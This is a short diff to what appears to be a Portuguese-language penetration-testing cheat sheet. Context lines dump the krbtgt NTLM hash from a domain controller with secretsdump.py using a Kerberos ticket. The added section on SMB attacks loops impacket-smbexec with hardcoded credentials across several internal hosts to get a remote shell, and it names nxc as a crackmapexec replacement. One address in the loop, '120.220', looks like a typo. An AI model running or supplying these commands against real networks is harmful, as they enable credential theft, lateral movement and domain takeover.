@@ -8774,6 +8774,12 @@ Gerar arquivo Criptografado com tipo de imagem para o pentest
     export KRB5CCNAME='/Path/fake_user.ccache'
     secretsdump.py -k dc01.floripa.local -just-dc-ntlm -just-dc-user krbtgt
 
+ATAQUES GERAIS AO SMB
+
+	for i in {100,110,120.220,230};do impacket-smbexec praias/sampaio:sexywolfy@192.168.161.$i ;done
+	impacket-smbexec praias/sampaio:sexywolfy@192.168.161.110 ACESSA A SHELL DIRETO DO HOST CASO TENHA PERMISSAO
+	nxc ALTERNATIVA AO crackmapexec
+ 
 TO BE CONTINUED
 .
 .
